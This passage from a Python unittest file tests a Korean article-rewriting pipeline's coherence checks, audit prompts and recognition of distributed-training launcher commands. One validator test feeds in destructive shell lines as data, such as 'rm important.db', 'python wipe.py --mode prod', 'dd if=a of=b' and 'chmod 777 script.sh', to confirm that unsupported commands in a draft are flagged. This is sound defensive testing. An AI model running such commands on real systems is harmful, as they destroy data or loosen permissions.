            + "\n\nTensorFlow 실행 명령입니다.\n\n```bash\necho TensorFlow\n```",
        }
        errors = rewrite.procedural_coherence_errors(echo_only)
        self.assertTrue(any("TensorFlow 내용은 고립된" in error for error in errors))

        api_code = {
            **base,
            "content": (
                "두 API 실행 결과를 확인합니다.\n\n"
                "## PyTorch 및 TensorFlow API 실행 예제\n\n"
                "PyTorch 실행 코드입니다.\n\n"
                "```python\nimport torch\nprint(torch.tensor([1.0]) + 1)\n```\n\n"
                "TensorFlow 실행 코드입니다.\n\n"
                "```python\nimport tensorflow as tf\nprint(tf.constant([1.0]) + 1)\n```"
            ),
        }
        errors = rewrite.procedural_coherence_errors(api_code)
        self.assertFalse(any("내용은 고립된" in error for error in errors))

    def test_content_coherence_rejects_verified_but_off_contract_padding(self):
        draft = {
            "title": "DarkNet Convolutional Layer 출력 크기 계산 식과 CUDNN 설정 주의사항",
            "description": "출력 크기 식과 CUDNN 버전별 groups 설정 조건을 확인합니다.",
            "summary": "출력 크기와 CUDNN 설정을 먼저 확인하고 라이선스도 소개합니다.",
            "content": (
                "출력 크기는 입력, 패딩, 커널 크기와 스트라이드로 계산합니다.\n\n"
                "## 출력 크기 계산과 CUDNN 설정 주의사항\n\n"
                "출력 크기 식과 groups 조건을 확인합니다.\n\n"
                "## 이진화 및 역정규화 연산 동작\n\n"
                "binarize_cpu와 denormalize_cpu 함수도 함께 살펴봅니다.\n\n"
                "Darknet은 public domain으로 공개됐습니다."
            ),
            "faq": [],
        }
        errors = rewrite.content_coherence_errors(draft)
        self.assertTrue(any("라이선스·법적 상태" in error for error in errors))
        self.assertTrue(any("이진화 및 역정규화" in error for error in errors))

    def test_content_coherence_accepts_sections_serving_visible_contract(self):
        draft = {
            "title": "DarkNet Convolutional Layer 출력 크기와 레이어 타입 설정",
            "description": "레이어 타입 지정과 해상도 조정 구조, 출력 크기 주의사항을 확인합니다.",
            "summary": "출력 크기와 레이어 설정 범위만 설명합니다.",
            "content": (
                "출력 크기와 레이어 설정 범위를 먼저 확인합니다.\n\n"
                "## 출력 크기 계산 주의사항\n\n"
                "입력과 커널 조건을 확인합니다.\n\n"
                "## 레이어 타입 지정 및 해상도 조정 구조\n\n"
                "해상도 조정은 레이어 타입 설정 과업에 해당하므로 두 구조를 함께 확인합니다."
            ),
            "faq": [],
        }
        self.assertEqual(rewrite.content_coherence_errors(draft), [])

    def test_content_coherence_allows_side_topic_when_publicly_promised(self):
        draft = {
            "title": "Darknet 라이선스와 public domain 표기 확인",
            "description": "프로젝트의 라이선스·법적 상태를 원문 기준으로 확인합니다.",
            "summary": "라이선스 표기의 의미를 확인합니다.",
            "content": (
                "라이선스 표기를 먼저 확인합니다.\n\n"
                "## 라이선스와 public domain 주의사항\n\n"
                "공개 문구의 범위를 확인합니다."
            ),
            "faq": [],
        }
        self.assertEqual(rewrite.content_coherence_errors(draft), [])

        commercial_contract = {
            **draft,
            "title": "Foo 상용 도입 전에 확인할 배포 조건",
            "description": "재배포와 상업적 이용 조건을 공식 원문 기준으로 확인합니다.",
            "summary": "라이선스 의무를 확인합니다.",
            "content": (
                "상용 배포 조건을 먼저 확인합니다.\n\n"
                "## 재배포 라이선스 조건과 주의사항\n\n"
                "상업적 이용과 재배포 조건에 연결된 라이선스를 확인합니다."
            ),
        }
        self.assertEqual(rewrite.content_coherence_errors(commercial_contract), [])

    def test_content_coherence_cannot_bootstrap_scope_from_summary_or_brand(self):
        research = {"primary_keyword": "DarkNet Convolutional Layer"}
        base = {
            "title": "DarkNet Convolutional Layer 출력 크기와 CUDNN 설정 주의",
            "description": "출력 크기와 CUDNN 조건에 더해 이진화 연산도 설명합니다.",
            "summary": "binarize_cpu와 역정규화 동작까지 함께 확인합니다.",
            "faq": [],
        }
        cases = (
            (
                "## 이진화 및 역정규화 연산 동작\n\n"
                "binarize_cpu와 역정규화 연산을 확인합니다.",
                "이진화",
            ),
            (
                "## 벤치마크\n\nDarkNet 벤치마크를 확인합니다.",
                "벤치마크",
            ),
            (
                "## DarkNet 이미지 로더 내부 구조\n\n"
                "DarkNet 이미지 로더의 내부 구조를 확인합니다.",
                "이미지 로더",
            ),
            (
                "## CUDNN 설정과 이미지 로더\n\n"
                "CUDNN 설정과 이미지 로더를 함께 확인합니다.",
                "이미지 로더",
            ),
        )
        for content, expected in cases:
            with self.subTest(expected=expected):
                errors = rewrite.content_coherence_errors(
                    {**base, "content": content}, research
                )
                self.assertTrue(any(expected in error for error in errors), errors)

    def test_content_coherence_accepts_explicit_alias_bridge(self):
        draft = {
            "title": "PyTorch 학습 중 GPU 메모리 부족 원인과 확인 순서",
            "description": "CUDA OOM이 발생할 때 확인할 조건을 설명합니다.",
            "summary": "GPU 메모리 부족과 CUDA OOM의 관계를 확인합니다.",
            "content": (
                "GPU 메모리 부족 원인을 먼저 확인합니다.\n\n"
                "## CUDA OOM 원인 확인\n\n"
                "CUDA OOM은 GPU 메모리 부족 상황과 연결해 확인해야 합니다."
            ),
            "faq": [],
        }
        self.assertEqual(
            rewrite.content_coherence_errors(
                draft, {"primary_keyword": "PyTorch 학습"}
            ),
            [],
        )

        training_task = {
            "title": "CycleGAN PyTorch DDP 학습과 테스트 실행 조건",
            "description": "train.py와 test.py의 실행 범위를 확인합니다.",
            "summary": "학습과 테스트 명령의 조건을 확인합니다.",
            "content": (
                "학습과 테스트 실행 조건을 먼저 확인합니다.\n\n"
                "## train.py 및 test.py 실행 조건\n\n"
                "학습과 테스트 실행 조건을 같은 기준으로 확인합니다."
            ),
            "entities": ["CycleGAN", "PyTorch"],
            "faq": [],
        }
        self.assertEqual(
            rewrite.content_coherence_errors(
                training_task,
                {"primary_keyword": "CycleGAN PyTorch 학습 테스트"},
            ),
            [],
        )

    def test_content_coherence_rejects_unexplained_off_scope_code(self):
        base = {
            "title": "DarkNet Convolutional Layer 출력 크기 계산",
            "description": "출력 높이와 너비를 계산하는 공식을 확인합니다.",
            "summary": "출력 크기 계산식을 확인합니다.",
            "faq": [],
        }
        wrong = {
            **base,
            "content": (
                "출력 크기 계산을 먼저 확인합니다.\n\n"
                "## 출력 크기 계산 주의사항\n\n"
                "다음은 binarize_cpu 함수 구현입니다.\n\n"
                "```c\nvoid binarize_cpu(float *input) { process_binary(input); }\n```"
            ),
        }
        errors = rewrite.content_coherence_errors(
            wrong, {"primary_keyword": "DarkNet Convolutional Layer"}
        )
        self.assertTrue(any("코드의 핵심 함수" in error for error in errors), errors)

        aligned = {
            **base,
            "content": (
                "출력 크기 계산을 먼저 확인합니다.\n\n"
                "## 출력 크기 계산 주의사항\n\n"
                "출력 너비를 계산하는 convolutional_out_width 함수의 핵심 식입니다.\n\n"
                "```c\nint convolutional_out_width(layer l) { return calculate_width(l); }\n```"
            ),
        }
        self.assertEqual(
            rewrite.content_coherence_errors(
                aligned, {"primary_keyword": "DarkNet Convolutional Layer"}
            ),
            [],
        )

    def test_content_coherence_skips_source_and_faq_navigation(self):
        draft = {
            "title": "DarkNet 출력 크기 계산 주의사항",
            "description": "출력 크기 계산식을 확인합니다.",
            "summary": "출력 크기를 확인합니다.",
            "content": (
                "출력 크기 계산을 먼저 확인합니다.\n\n"
                "## 직접 확인한 원문\n\n공식 원문을 확인합니다.\n\n"
                "## 자주 묻는 질문 FAQ\n\n질문을 확인합니다."
            ),
            "faq": [],
        }
        self.assertEqual(rewrite.content_coherence_errors(draft), [])

    def test_content_coherence_allows_verified_details_under_explicit_umbrella_title(self):
        draft = {
            "title": "Slurm 작업 관리 핵심 명령어와 root 권한 주의사항",
            "description": "제출, 조회, 취소에 쓰는 명령을 같은 작업 관리 흐름에서 확인합니다.",
            "summary": "Slurm 작업 관리 명령을 단계별로 확인합니다.",
            "content": (
                "작업 제출부터 취소까지 필요한 명령을 먼저 확인합니다.\n\n"
                "## sbatch와 srun 작업 제출\n\n"
                "sbatch와 srun으로 작업을 제출합니다.\n\n"
                "## sinfo와 squeue 조회 및 scancel 취소 주의사항\n\n"
                "sinfo, squeue, scancel의 작업 관리 범위를 확인합니다."
            ),
            "entities": ["Slurm"],
            "faq": [],
        }
        research = {
            "primary_keyword": "Slurm 작업 스케줄러",
            "reader_problem": "클러스터 작업 제출과 상태 확인 및 취소 명령을 활용하지 못함",
            "reader_promise": "sbatch, srun, sinfo, squeue, scancel로 작업을 관리한다",
            "popular_questions": [],
        }
        self.assertEqual(rewrite.content_coherence_errors(draft, research), [])

    def test_adjacent_same_evidence_paraphrase_is_rejected(self):
        content = (
            "YOLOv3의 22 ms 측정값은 320x320 입력 조건입니다 "
            "[논문](https://arxiv.org/abs/1804.02767). "
            "YOLOv3 320x320 추론 속도에는 22 ms라는 조건이 적용됩니다 "
            "[논문](https://arxiv.org/abs/1804.02767)."
        )
        self.assertTrue(rewrite.adjacent_semantic_duplicate_errors(content))
        distinct = (
            "POWER_SAVING 노드는 물결표로 표시됩니다 "
            "[문서](https://docs.example.org/slurm). "
            "POWER_DOWN 전환 중인 노드는 퍼센트 기호로 표시됩니다 "
            "[문서](https://docs.example.org/slurm)."
        )
        self.assertEqual(rewrite.adjacent_semantic_duplicate_errors(distinct), [])
        parallel_paths = (
            "준비할 디렉터리는 다음과 같습니다.\n"
            "- 도메인 A 학습 이미지는 `/path/to/data/trainA`에 저장합니다.\n"
            "- 도메인 B 학습 이미지는 `/path/to/data/trainB`에 저장합니다."
        )
        self.assertEqual(
            rewrite.adjacent_semantic_duplicate_errors(parallel_paths),
            [],
        )
        parallel_limits = (
            "Activepieces Community Edition은 플로우 수 제한 없이 이용할 수 있습니다. "
            "Activepieces Community Edition은 사용자 수 제한 없이 이용할 수 있습니다."
        )
        self.assertEqual(
            rewrite.adjacent_semantic_duplicate_errors(parallel_limits),
            [],
        )

    def test_verifier_carries_section_context_and_hard_reader_issues(self):
        draft = {
            "title": "Activepieces 배포 방식 확인",
            "description": "",
            "summary": "",
            "content": (
                "결론을 먼저 확인합니다.\n\n"
                "## PGLite 단일 실행의 한계\n\n"
                "Docker Compose 환경에는 Git이 필요합니다."
            ),
            "faq": [],
        }
        body_unit = next(
            unit for unit in rewrite.build_draft_units(draft)
            if unit["text"].startswith("Docker Compose")
        )
        self.assertEqual(body_unit["section_heading"], "PGLite 단일 실행의 한계")

        verification = rewrite.clean_verification({
            "approved": False,
            "reader_ready": False,
            "reader_issues": [{
                "code": "section_scope_mismatch",
                "excerpt": "Docker Compose 환경에는 Git이 필요합니다",
                "reason": "PGLite 단일 컨테이너 섹션 안에 Compose 조건이 섞여 범위가 달라집니다.",
            }],
            "unit_checks": [],
        })
        self.assertTrue(rewrite.verification_requires_draft_revision(verification))
        errors = rewrite.validate_verification(verification, {}, draft)
        self.assertTrue(any("section_scope_mismatch" in error for error in errors))

    def test_retry_prompts_narrow_unsupported_promises_instead_of_inventing_steps(self):
        prior_research = {
            "reader_promise": "TensorFlow 전체 실행 절차를 제공합니다",
            "facts": [],
            "limitations": [],
        }
        research_text = rewrite.research_prompt(
            {"title": "CycleGAN"},
            [],
            prior_research,
            ["검색 의도·독자 약속의 TensorFlow 절차를 지지하는 F/L이 없음"],
        )
        self.assertIn("완전히 삭제", research_text)
        self.assertIn("한 가지 좁은 질문", research_text)

        draft = {
            "title": "CycleGAN 전체 실행 절차",
            "description": "",
            "summary": "",
            "content": "",
            "tags": [],
            "entities": [],
            "faq": [],
        }
        audit_text = rewrite.audit_prompt(
            {},
            {"reader_promise": "전체 학습 절차", "facts": [], "limitations": []},
            draft,
            [
                "독자 품질 차단 procedure_incomplete: DDP 분산 설정에 런처가 없음",
                "orphan_section: H2 '라이선스 법적 상태'가 제목 범위 밖임",
                "본문에서 서로 다른 직접 원문 2개를 인용하지 않음",
                "도입부가 문제별 결론·행동·주의점보다 정의를 먼저 제시함",
            ],
        )
        self.assertIn("좁은 글로 즉시 바꾸십시오", audit_text)
        self.assertIn("초기 편집 목표", audit_text)
        self.assertIn("DDP 과대약속 삭제", audit_text)
        self.assertIn("required exact argv", audit_text)
        self.assertIn("라이선스 축 삭제", audit_text)
        self.assertIn("공백 제외 1,000~6,500자", audit_text)
        self.assertIn("결론부터 말하면", audit_text)

        launcher_audit_text = rewrite.audit_prompt(
            {},
            {
                "reader_promise": (
                    "`torchrun --nproc_per_node=2 train.py --epochs 10`으로 "
                    "DDP 분산 학습 실행 절차를 제공합니다."
                ),
                "facts": [{
                    "statement": (
                        "분산 학습은 `torchrun --nproc_per_node=2 "
                        "train.py --epochs 10`으로 실행한다."
                    ),
                }],
                "limitations": [],
            },
            draft,
            ["독자 품질 차단 procedure_incomplete: DDP 분산 설정에 런처가 없음"],
        )
        self.assertIn("DDP 런처 복원", launcher_audit_text)
        self.assertIn(
            "torchrun --nproc_per_node=2 train.py --epochs 10",
            launcher_audit_text,
        )
        self.assertNotIn("[DDP 과대약속 삭제]", launcher_audit_text)

        for natural_promise in (
            (
                "DDP 분산 학습 실행 방법을 설명합니다. "
                "`torchrun --nproc_per_node=2 train.py` 명령으로 실행합니다."
            ),
            (
                "DDP 분산 학습 실행 방법을 설명합니다. "
                "`torchrun --nproc_per_node=2 train.py` 명령을 실행합니다."
            ),
            "DDP 분산 학습은 `torchrun --nproc_per_node=2 train.py`으로 실행합니다.",
        ):
            with self.subTest(ddp_natural_positive_command=natural_promise):
                command_text = "torchrun --nproc_per_node=2 train.py"
                research = {
                    "reader_promise": natural_promise,
                    "facts": [{"statement": f"실행 예시는 `{command_text}`이다."}],
                    "limitations": [],
                }
                self.assertIn(
                    ("torchrun", "--nproc_per_node=2", "train.py"),
                    rewrite.research_public_ddp_launcher_signatures(research),
                )

        unrelated_launcher_text = rewrite.audit_prompt(
            {},
            {
                "reader_promise": "DDP 실행 절차가 아니라 정규화 옵션만 설명합니다.",
                "facts": [{"statement": "별도 실행 예시는 `srun -n 2 train.py`이다."}],
                "limitations": [],
            },
            draft,
            ["독자 품질 차단 procedure_incomplete: DDP 분산 설정에 런처가 없음"],
        )
        self.assertIn("DDP 과대약속 삭제", unrelated_launcher_text)
        self.assertNotIn("[DDP 런처 복원]", unrelated_launcher_text)

        no_cardinality_text = rewrite.audit_prompt(
            {},
            {
                "reader_promise": (
                    "`srun train.py`로 DDP 분산 학습 실행 절차를 제공합니다."
                ),
                "facts": [{"statement": "실행 예시는 `srun train.py`이다."}],
                "limitations": [],
            },
            draft,
            ["독자 품질 차단 procedure_incomplete: DDP 분산 설정에 런처가 없음"],
        )
        self.assertIn("DDP 과대약속 삭제", no_cardinality_text)
        self.assertNotIn("[DDP 런처 복원]", no_cardinality_text)

        cross_bound_launcher_text = rewrite.audit_prompt(
            {},
            {
                "reader_promise": "DDP 분산 학습 실행 절차를 제공합니다.",
                "popular_questions": [
                    "별도 MPI 학습은 `mpirun -np 2 train.py`로 실행하나요?"
                ],
                "facts": [{
                    "statement": "별도 MPI 실행 예시는 `mpirun -np 2 train.py`이다."
                }],
                "limitations": [],
            },
            draft,
            ["독자 품질 차단 procedure_incomplete: DDP 분산 설정에 런처가 없음"],
        )
        self.assertIn("DDP 과대약속 삭제", cross_bound_launcher_text)
        self.assertNotIn("[DDP 런처 복원]", cross_bound_launcher_text)

        natural_split_text = rewrite.audit_prompt(
            {},
            {
                "reader_promise": "DDP 분산 학습 실행 절차를 제공합니다.",
                "popular_questions": [
                    "`torchrun --nproc_per_node=2 train.py --epochs 10`로 실행하나요?"
                ],
                "facts": [{
                    "statement": (
                        "실행 예시는 `torchrun --nproc_per_node=2 "
                        "train.py --epochs 10`이다."
                    ),
                }],
                "limitations": [],
            },
            draft,
            ["독자 품질 차단 procedure_incomplete: DDP 분산 설정에 런처가 없음"],
        )
        self.assertIn("DDP 런처 복원", natural_split_text)

        for split_command in (
            "deepspeed --num_gpus=2 train.py",
            "accelerate launch --num_processes=2 train.py",
        ):
            with self.subTest(valid_split_launcher=split_command):
                text = rewrite.audit_prompt(
                    {},
                    {
                        "reader_promise": "DDP 분산 학습 실행 절차를 제공합니다.",
                        "popular_questions": [f"`{split_command}`로 실행하나요?"],
                        "facts": [{"statement": f"실행 예시는 `{split_command}`이다."}],
                        "limitations": [],
                    },
                    draft,
                    ["procedure_incomplete: DDP 분산 설정에 런처가 없음"],
                )
                self.assertIn("DDP 런처 복원", text)

        positive_with_unrelated_negation = rewrite.audit_prompt(
            {},
            {
                "reader_promise": (
                    "DDP 분산 학습 실행 방법을 제공하지만 별도 설치는 요구하지 않습니다."
                ),
                "popular_questions": [
                    "`torchrun --nproc_per_node=2 train.py --epochs 10`로 실행하나요?"
                ],
                "facts": [{
                    "statement": (
                        "실행 예시는 `torchrun --nproc_per_node=2 "
                        "train.py --epochs 10`이다."
                    ),
                }],
                "limitations": [],
            },
            draft,
            ["procedure_incomplete: DDP 분산 설정에 런처가 없음"],
        )
        self.assertIn("DDP 런처 복원", positive_with_unrelated_negation)

        for adjacent_command in (
            "mpirun -np 2 train.py --epochs 10",
            "srun -n 2 train.py --epochs 10",
        ):
            with self.subTest(adjacent_same_field_launcher=adjacent_command):
                text = rewrite.audit_prompt(
                    {},
                    {
                        "reader_promise": (
                            "DDP 분산 학습 실행 방법을 설명합니다. "
                            f"`{adjacent_command}` 실행 명령을 제공합니다."
                        ),
                        "facts": [{
                            "statement": f"실행 예시는 `{adjacent_command}`이다."
                        }],
                        "limitations": [],
                    },
                    draft,
                    ["procedure_incomplete: DDP 분산 설정에 런처가 없음"],
                )
                self.assertIn("DDP 런처 복원", text)

        for positive_verb in (
            "익힙니다", "배웁니다", "확인합니다", "알아봅니다", "보여드립니다",
            "실습합니다", "사용합니다",
        ):
            with self.subTest(ddp_positive_promise_verb=positive_verb):
                command_text = "torchrun --nproc_per_node=2 train.py --epochs 10"
                research = {
                    "reader_promise": f"DDP 분산 학습 실행 방법을 {positive_verb}",
                    "popular_questions": [f"`{command_text}`로 실행하나요?"],
                    "facts": [{"statement": f"실행 예시는 `{command_text}`이다."}],
                    "limitations": [],
                }
                self.assertIn(
                    ("torchrun", "--nproc_per_node=2", "train.py", "--epochs", "10"),
                    rewrite.research_public_ddp_launcher_signatures(research),
                )

        for positive_ending in (
            "구현합니다",
            "완성합니다",
            "연습합니다",
            "따라 해봅니다",
            "실행할 수 있습니다",
            "익힐 수 있습니다",
            "안내해 드립니다",
            "정리해 드립니다",
        ):
            with self.subTest(ddp_positive_promise_ending=positive_ending):
                command_text = "torchrun --nproc_per_node=2 train.py --epochs 10"
                research = {
                    "reader_promise": f"DDP 분산 학습 실행 방법을 {positive_ending}",
                    "popular_questions": [f"`{command_text}`로 실행하나요?"],
                    "facts": [{"statement": f"실행 예시는 `{command_text}`이다."}],
                    "limitations": [],
                }
                self.assertIn(
                    ("torchrun", "--nproc_per_node=2", "train.py", "--epochs", "10"),
                    rewrite.research_public_ddp_launcher_signatures(research),
                )

        negative_promises = (
            (
                "DDP 튜토리얼은 제공하지 않습니다. 참고용 명령은 "
                "`torchrun --nproc_per_node=2 train.py --epochs 10`입니다."
            ),
            (
                "`torchrun --nproc_per_node=2 train.py --epochs 10`으로 DDP 분산 "
                "학습 설정 방법을 이 글에서는 독자의 오해를 막기 위한 여러 이유 때문에 "
                "절대로 제공하지 않습니다."
            ),
            (
                "`torchrun --nproc_per_node=2 train.py --epochs 10`으로 DDP 분산 "
                "학습 설정 방법을\n제공하지 않습니다."
            ),
            (
                "`torchrun --nproc_per_node=2 train.py --epochs 10`으로 DDP 분산 "
                "학습 설정 방법을 전혀 소개하지 않습니다."
            ),
            (
                "`torchrun --nproc_per_node=2 train.py --epochs 10`으로 DDP 분산 "
                "학습 설정 방법은 이 글의 목표가 아닙니다."
            ),
            "DDP 튜토리얼은 생략합니다.",
            "DDP 설정 방법은 이 글의 범위 밖입니다.",
            "DDP 실행 절차 대신 정규화 옵션만 설명합니다.",
            "DDP 실행 방법을 건너뜁니다.",
        )
        for promise in negative_promises:
            with self.subTest(negative_ddp_promise=promise):
                text = rewrite.audit_prompt(
                    {},
                    {
                        "reader_promise": promise,
                        "facts": [{
                            "statement": (
                                "실행 예시는 `torchrun --nproc_per_node=2 "
                                "train.py --epochs 10`이다."
                            ),
                        }],
                        "limitations": [],
                    },
                    draft,
                    ["procedure_incomplete: DDP 분산 설정에 런처가 없음"],
                )
                self.assertIn("DDP 과대약속 삭제", text)
                self.assertNotIn("[DDP 런처 복원]", text)

        for problem in (
            "DDP 분산 학습 설정 방법을 모릅니다.",
            "DDP 분산 학습 설정 방법이 궁금합니다.",
            "DDP 분산 학습 설정 방법을 찾고 있습니다.",
        ):
            with self.subTest(ddp_reader_problem_is_not_promise=problem):
                command_text = "torchrun --nproc_per_node=2 train.py --epochs 10"
                text = rewrite.audit_prompt(
                    {},
                    {
                        "reader_problem": f"`{command_text}`을 쓰는 {problem}",
                        "facts": [{"statement": f"실행 예시는 `{command_text}`이다."}],
                        "limitations": [],
                    },
                    draft,
                    ["procedure_incomplete: DDP 분산 설정에 런처가 없음"],
                )
                self.assertIn("DDP 과대약속 삭제", text)

        for non_use in (
            "본문에서는 `{command}` 명령을 쓰지 않습니다.",
            "본문에서는 `{command}` 명령을 싣지 않습니다.",
            "본문에서는 `{command}` 명령을 보여주지 않습니다.",
            "본문에서는 `{command}` 명령을 사용하지 않습니다.",
            "본문에서는 `{command}`를 예시로만 언급합니다.",
            "본문에서는 `{command}`를 실행 안 합니다.",
            "본문에서는 `{command}`를 사용 안 합니다.",
            "본문에서는 `{command}`를 실행 안 하나요?",
            "본문에서는 `{command}`를 사용 안 하나요?",
            "본문에서는 `{command}` 실행은 안 합니다.",
            "본문에서는 `{command}` 실행을 안 합니다.",
            "본문에서는 `{command}` 사용은 안 합니다.",
            "본문에서는 `{command}` 사용을 안 합니다.",
            "본문에서는 `{command}` 실행은 안 하나요?",
            "본문에서는 `{command}` 실행을 생략합니다.",
            "본문에서는 `{command}` 사용 대신 설명만 합니다.",
            "본문에서는 `{command}` 실행 대신 옵션만 설명합니다.",
            "본문에서는 `{command}` 실행을 건너뜁니다.",
            "본문에서는 `{command}` 실행은 범위 밖입니다.",
        ):
            command_text = "torchrun --nproc_per_node=2 train.py --epochs 10"
            promise = (
                "DDP 분산 학습 실행 방법을 설명합니다. "
                + non_use.format(command=command_text)
            )
            with self.subTest(ddp_command_non_use=promise):
                text = rewrite.audit_prompt(
                    {},
                    {
                        "reader_promise": promise,
                        "facts": [{"statement": f"실행 예시는 `{command_text}`이다."}],
                        "limitations": [],
                    },
                    draft,
                    ["procedure_incomplete: DDP 분산 설정에 런처가 없음"],
                )
                self.assertIn("DDP 과대약속 삭제", text)
                self.assertNotIn("[DDP 런처 복원]", text)

        for promise in (
            "DDP 분산 학습 실행 방법을 설명하며 `{command}` 명령은 본문에 넣지 않습니다.",
            "DDP 분산 학습 실행 방법을 설명하고 `{command}` 명령은 게재하지 않습니다.",
        ):
            command_text = "torchrun --nproc_per_node=2 train.py --epochs 10"
            with self.subTest(ddp_same_unit_non_use=promise):
                text = rewrite.audit_prompt(
                    {},
                    {
                        "reader_promise": promise.format(command=command_text),
                        "facts": [{"statement": f"실행 예시는 `{command_text}`이다."}],
                        "limitations": [],
                    },
                    draft,
                    ["procedure_incomplete: DDP 분산 설정에 런처가 없음"],
                )
                self.assertIn("DDP 과대약속 삭제", text)
                self.assertNotIn("[DDP 런처 복원]", text)

        for negative_fact_verb in (
            "사용하지 않습니다",
            "쓰지 않습니다",
            "제공하지 않습니다",
            "실행 안 합니다",
            "사용 안 합니다",
        ):
            command_text = "torchrun --nproc_per_node=2 train.py"
            research = {
                "reader_promise": (
                    f"`{command_text}`으로 DDP 분산 학습 실행 절차를 제공합니다."
                ),
                "facts": [{
                    "statement": (
                        f"DDP 분산 학습에서는 `{command_text}` 명령을 "
                        f"{negative_fact_verb}."
                    ),
                }],
                "limitations": [],
            }
            with self.subTest(ddp_negative_evidence=negative_fact_verb):
                self.assertFalse(
                    rewrite.command_claim_is_positive(
                        rewrite.research_command_records(research)[0]
                    )
                )
                text = rewrite.audit_prompt(
                    {},
                    research,
                    draft,
                    ["procedure_incomplete: DDP 분산 설정에 런처가 없음"],
                )
                self.assertIn("DDP 과대약속 삭제", text)
                self.assertNotIn("[DDP 런처 복원]", text)

        no_cli_promise = {
            "reader_promise": (
                "실행 절차나 명령을 제공하지 않고 정규화 옵션의 의미만 설명합니다."
            ),
            "facts": [{
                "statement": (
                    "참고 문서에는 `python wipe.py --mode prod` 명령이 있다."
                ),
            }],
            "limitations": [],
        }
        self.assertFalse(rewrite.research_has_operational_cli_promise(no_cli_promise))
        for command_location in (
            {
                "content": "```bash\npython wipe.py --mode prod\n```",
                "faq": [],
            },
            {
                "content": "정규화 옵션의 의미만 설명합니다.",
                "faq": [{
                    "question": "실행 명령도 있나요?",
                    "answer": "```bash\npython wipe.py --mode prod\n```",
                }],
            },
            {
                "content": "정규화 옵션의 의미만 설명합니다.",
                "faq": [{
                    "question": "텍스트 예시는 있나요?",
                    "answer": "```text\npython wipe.py --mode prod\n```",
                }],
            },
            {
                "content": "정규화 옵션의 의미만 설명합니다.",
                "faq": [{
                    "question": "파이썬 예시는 있나요?",
                    "answer": (
                        "```python\nimport os\n"
                        "os.system(\"python wipe.py --mode prod\")\n```"
                    ),
                }],
            },
            {
                "content": "정규화 옵션의 의미만 설명합니다.",
                "faq": [{
                    "question": "다른 배포 명령도 있나요?",
                    "answer": "```text\nwrangler deploy prod\n```",
                }],
            },
            {
                "content": "정규화 옵션의 의미만 설명합니다.",
                "faq": [{
                    "question": "지원 명령은 무엇인가요?",
                    "answer": "```\npython wipe.py --mode prod\n```",
                }],
            },
        ):
            with self.subTest(non_operational_published_command=command_location):
                errors = rewrite.draft_runnable_procedure_errors(
                    command_location,
                    no_cli_promise,
                )
                self.assertTrue(any("긍정형 CLI 실행 약속이 없는데" in e for e in errors), errors)

        supported_unknown_cli = {
            **no_cli_promise,
            "facts": [{"statement": "참고 명령은 `mytool publish prod`이다."}],
        }
        errors = rewrite.draft_runnable_procedure_errors(
            {
                "content": "정규화 옵션의 의미만 설명합니다.",
                "faq": [{
                    "question": "참고 명령은 무엇인가요?",
                    "answer": "```plaintext\nmytool publish prod\n```",
                }],
            },
            supported_unknown_cli,
        )
        self.assertTrue(any("긍정형 CLI 실행 약속이 없는데" in e for e in errors), errors)

        for multi_level_cli in (
            "wrangler pages deploy dist",
            "wrangler d1 execute db",
            "gh pr create",
            "aws s3 cp a b",
            "gcloud compute instances list",
            "az group create",
        ):
            with self.subTest(non_shell_multi_level_cli=multi_level_cli):
                errors = rewrite.draft_runnable_procedure_errors(
                    {
                        "content": f"```text\n{multi_level_cli}\n```",
                        "faq": [],
                    },
                    no_cli_promise,
                )
                self.assertTrue(
                    any("긍정형 CLI 실행 약속이 없는데" in e for e in errors),
                    errors,
                )

        for core_shell_cli in (
            "rm important.db",
            "cp source target",
            "mv source target",
            "chmod 777 script.sh",
            "chown root file",
            "dd if=a of=b",
        ):
            with self.subTest(non_shell_core_cli=core_shell_cli):
                errors = rewrite.draft_runnable_procedure_errors(
                    {"content": f"```text\n{core_shell_cli}\n```", "faq": []},
                    no_cli_promise,
                )
                self.assertTrue(
                    any("긍정형 CLI 실행 약속이 없는데" in e for e in errors),
                    errors,
                )

        for inert_non_shell in (
            "```text\ninstallation completed successfully\n```",
            '```json\n{"command":"mytool publish prod"}\n```',
        ):
            with self.subTest(inert_non_shell_data=inert_non_shell):
                self.assertEqual(
                    rewrite.draft_runnable_procedure_errors(
                        {"content": inert_non_shell, "faq": []},
                        no_cli_promise,
                    ),
                    [],
                )

        for log_statement in (
            "참고 로그는 `INFO request completed 200`이다.",
            "오류 로그 예제는 `INFO request completed 200`이다.",
            "실행 로그는 `INFO request completed 200`이다.",
            "응답 메시지 예제는 `INFO request completed 200`이다.",
        ):
            with self.subTest(non_command_output_literal=log_statement):
                exact_log_research = {
                    **no_cli_promise,
                    "facts": [{"statement": log_statement}],
                }
                self.assertEqual(
                    rewrite.draft_runnable_procedure_errors(
                        {
                            "content": "```text\nINFO request completed 200\n```",
                            "faq": [],
                        },
                        exact_log_research,
                    ),
                    [],
                )

        for hidden_no_cli_code in (
            "    python wipe.py --mode prod",
            "> ```bash\n> python wipe.py --mode prod\n> ```",
        ):
            errors = rewrite.draft_runnable_procedure_errors(
                {
                    "content": "정규화 옵션의 의미만 설명합니다.",
                    "faq": [{"question": "명령도 있나요?", "answer": hidden_no_cli_code}],
                },
                no_cli_promise,
            )
            self.assertTrue(any("최상위 fenced block만 허용" in e for e in errors), errors)

        for command_text in (
            "torchrun train.py --nproc_per_node=2",
            "deepspeed train.py --num_gpus 2",
            "mpirun train.py -np 2",
            "srun train.py --ntasks 2",
            "accelerate launch train.py --num_processes 2",
            "torchrun --nproc_per_node=2 --nproc_per_node=1 train.py",
            "torchrun --nnodes=2 --nnodes=1 train.py",
            "srun --ntasks=2 --ntasks=1 train.py",
            "torchrun --nnodes=1:2 train.py",
            "srun --nodes=1-4 train.py",
            "torchrun --nnodes=2:1 train.py",
            "srun --nodes=4-2 train.py",
            "srun --nodes=2 --ntasks=1 train.py",
            "accelerate launch --num_machines=2 --num_processes=1 train.py",
            "torchrun --num_gpus=2 train.py",
            "torchrun --num_processes=2 train.py",
            "mpirun --nproc_per_node=2 train.py",
            "srun --num_processes=2 train.py",
            "deepspeed --nnodes=2 train.py",
        ):
            with self.subTest(nonparallel_launcher_contract=command_text):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"실행은 `{command_text}`이다."}],
                    "limitations": [],
                })[0]
                self.assertFalse(
                    rewrite.distributed_launcher_has_explicit_parallelism(command)
                )

        for command_text in (
            "torchrun --nnodes=2:4 train.py --epochs 10",
            "srun --nodes=2-4 train.py --epochs 10",
            "mpirun -np 2 -H host1,host2 train.py --epochs 10",
        ):
